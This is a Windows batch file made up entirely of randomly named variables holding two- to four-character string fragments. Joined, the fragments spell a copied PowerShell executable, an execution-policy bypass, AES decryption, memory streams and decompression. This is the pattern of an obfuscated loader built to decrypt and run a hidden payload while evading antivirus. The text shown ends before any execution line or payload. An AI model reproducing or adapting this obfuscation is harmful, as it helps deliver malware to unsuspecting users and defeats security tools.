@echo off
set "HcQzqsCzPB=ll"
set "zcNFTCzMQo=ll"
set "PmRvdNNeaq=py"
set "mBFmgOIiUF=nd"
set "WfmsXHMRRE=ow"
set "PQlgkNMJvb=co"
set "YPlmACMJHe=1."
set "yUHSjdRpTv=\v"
set "mPhpBgBFax=Wi"
set "xvXRLoFfuB=xe"
set "QezGLtxkxM=in"
set "OADYgfMVIY=0\"
set "dzYbOkxcBX=\W"
set "UQHPCKzmBv=32"
set "HrnXRTLMHr=ws"
set "kbhdlERGxd= C"
set "GlnkUPraej=Po"
set "eizZEzSFRk=:\"
set "oOfhVZdUID=do"
set "rWGVxGdXTM=he"
set "oiWUsezaAu=.e"
set "FSRLNYqIMe=rs"
set "zESxQiZMCs=y "
set "QKKlogDPsU=st"
set "hCuYqzQCPR=rS"
set "npPOhpuQfO=we"
set "IKCfgcAUmg=he"
set "OTKmoCemRk= /"
set "llbRiSRDYN=we"
set "dlGZRCDmTQ=Sy"
set "XrMnsOdJVc=po"
set "VinQeuTRBf=s\"
set "tJOvCeoPhL=em"
set "QpUNZnLvsR=cd"
set "UWcOGaBERY= %~dp0"
set "bRRFViTmEd=);$K"
set "AKLiKqkgWL=();$"
set "OXaTfPnufp=($Eo"
set "YhUhcHAQre=ect "
set "seZxCYcDnt= [Sy"
set "ItFpbgwxah=.Dis"
set "tfZEQfygiV=SzfZ"
set "kaUVRAAlFS=gsYZ"
set "qldPOERunO=;$ZG"
set "sZGuULGiLA=-ep "
set "yyzrYULAcI= [Sy"
set "jBvQXFbpzd=pStr"
set "eAFusUWbYW=Mode"
set "NmsfZnbNMl=eLbY"
set "iKfapKfHNt=rity"
set "WqCWxIwofv=ne);"
set "VBODFcHvnX=FzuE"
set "PcWFMRYIXu=hy.A"
set "LQtUPjyUaX=)($S"
set "QkWYtXHxFL=New-"
set "jEuMFvnPgR=bY ="
set "jBaqTcmptB=)($G"
set "oUcFDoiZrJ=[IO."
set "rixadHAhWD=..-1"
set "SGfxURoNrj=tryP"
set "CBxhlDHZlh=[Sys"
set "LCCJFYMVOO=.Key"
set "OOtZBzeauP=Disp"
set "YCNKMZSmZt=:: '"
set "FEJINPBSRb=oArr"
set "wzlpjZNgUq=::De"
set "BGHWJtDkyA=V = "
set "NzzBRHqpsg=iron"
set "ArwVhvSMPl=ose("
set "LHDARhYufk=3); "
set "lUCWzgNZbc=Zp);"
set "UzUapNvlsS=gth)"
set "jaTLlOJRtG=daeR"
set "fMENbjxXeO=PxEW"
set "MhuMOLEtbj=mory"
set "YwMldTbAUL=brea"
set "PbVpgPbGLV='0Pg"
set "dMBiLHpapl=$Szf"
set "kxHOjDiVNe=bY);"
